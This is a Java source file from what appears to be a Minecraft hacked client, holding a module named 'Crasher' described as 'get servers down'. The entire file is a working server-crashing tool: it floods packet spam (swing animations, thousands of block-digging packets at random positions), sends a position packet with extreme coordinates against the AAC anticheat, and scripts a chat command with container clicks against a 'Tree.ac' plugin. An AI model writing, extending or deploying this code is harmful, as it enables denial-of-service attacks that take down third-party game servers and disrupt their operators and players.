package koks.module.utilities;

import koks.api.event.Event;
import koks.api.manager.notification.NotificationManager;
import koks.api.manager.value.annotation.Value;
import koks.api.registry.module.Module;
import koks.api.utils.RandomUtil;
import koks.event.DisplayGuiScreenEvent;
import koks.event.UpdateEvent;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiScreenWorking;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C07PacketPlayerDigging;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;

@Module.Info(name = "Crasher", category = Module.Category.UTILITIES, description = "get servers down")
public class Crasher extends Module {

    @Value(name = "Mode", modes = {"Swing", "Intave13", "AAC5.0.14", "Tree.ac"})
    String mode = "Swing";

    @Value(name = "Swing-Packets", displayName = "Packets", minimum = 100, maximum = 10000)
    int swingPackets = 100;

    @Value(name = "Intave13-Packets", displayName = "Packets", minimum = 10, maximum = 10000)
    int intave13Packets = 100;

    @Value(name = "Intave13-Range", displayName = "Range", minimum = 1, maximum = 1000)
    int intave13Range = 10;

    @Override
    public boolean isVisible(koks.api.manager.value.Value<?> value, String name) {
        return switch (name) {
            case "Intave13-Packets", "Intave13-Range" -> mode.equalsIgnoreCase("Intave13");
            case "Swing-Packets" -> mode.equalsIgnoreCase("Swing");
            default -> super.isVisible(value, name);
        };
    }

    @Override
    @Event.Info
    public void onEvent(Event event) {
        if (event instanceof final DisplayGuiScreenEvent guiScreenEvent) {
            if (guiScreenEvent.getScreen() instanceof GuiDisconnected || guiScreenEvent.getScreen() instanceof GuiDownloadTerrain)
                toggle();
        }
        if (event instanceof UpdateEvent) {
            switch (mode) {
                case "Swing":
                    for (int i = 0; i < swingPackets; i++)
                        sendPacketUnlogged(new C0APacketAnimation());
                    break;
                case "Intave13":
                    final RandomUtil randomUtil = RandomUtil.getInstance();
                    for (int i = 0; i < intave13Packets; i++) {
                        final BlockPos blockPos = getPlayer().getPosition().add(randomUtil.getRandomInteger(-intave13Range, intave13Range), randomUtil.getRandomInteger(-15, 15), randomUtil.getRandomInteger(-intave13Range, intave13Range));
                        sendPacketUnlogged(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.STOP_DESTROY_BLOCK, blockPos, EnumFacing.DOWN));
                    }
                    break;
                case "AAC5.0.14":
                    sendPacketUnlogged(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999, 0, true));
                    break;
                case "Tree.ac":
                    if (mc.isSingleplayer()) return;
                    sendPacketUnlogged(new C01PacketChatMessage("/ac"));
                    if (getPlayer().openContainer != null) {
                        if (getPlayer().openContainer.inventorySlots.size() >= 10)
                            for (int i = 0; i < 10; i++)
                                getPlayerController().windowClick(getPlayer().openContainer.windowId, i, 0, 0, getPlayer());
                    }
                    break;
            }
        }
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onDisable() {

    }
}
